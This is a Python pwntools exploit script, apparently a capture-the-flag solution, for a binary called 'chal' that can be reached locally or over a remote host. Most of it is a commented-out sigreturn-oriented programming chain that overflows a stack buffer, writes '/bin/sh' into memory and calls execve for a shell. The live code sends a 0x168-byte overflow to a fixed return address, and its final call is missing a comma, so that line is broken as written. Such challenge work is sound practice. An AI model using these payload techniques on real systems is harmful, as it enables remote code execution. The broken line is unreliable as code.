#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./chal', checksec=False)

def setup():
    if args.LOCAL:
        p = elf.process()
    if args.DOCKER:
        p = remote("localhost", 12345)
    if args.REMOTE:
        p = remote(sys.argv[1], sys.argv[2])
    
    return p

p = setup()

input()

# pop_rax = 0x10c5cc4
# syscall = 0x1038e9a
# bss_addr = 0x10d7aa0

# frame1 = SigreturnFrame()
# frame1.rax = 0                     
# frame1.rdi = 0                     
# frame1.rsi = bss_addr              
# frame1.rdx = 0x500                 
# frame1.rsp = bss_addr + 0x200      
# frame1.rbp = bss_addr + 0x300      
# frame1.rip = syscall               

# offset = 0x168
# payload = flat (
#     b'A' * offset,
#     p64(pop_rax),
#     p64(0xf),
#     p64(syscall),
#     bytes(frame1),
# )

# p.sendline(payload)

# data_to_write = b'/bin/sh\x00' + b'A' * (0x200 - 0x8)
# data_to_write += p64(0x4011f7)

# p.sendline(data_to_write)

# frame = SigreturnFrame()
# frame.rax = 0x3b                    # execve syscall number
# frame.rdi = bss_addr              # cần tìm/write "/bin/sh" vào memory
# frame.rsi = 0
# frame.rdx = 0  
# frame.rip = syscall                 # sau sigreturn sẽ gọi syscall execve

# payload = flat (
#     b'A' * 0x88,
#     p64(pop_rax),
#     p64(0xf),
#     p64(syscall),
#     bytes(frame),
# )


p.sendlineafter(b'.'b'A' * 0x168 + p64(0x1035130))

p.interactive()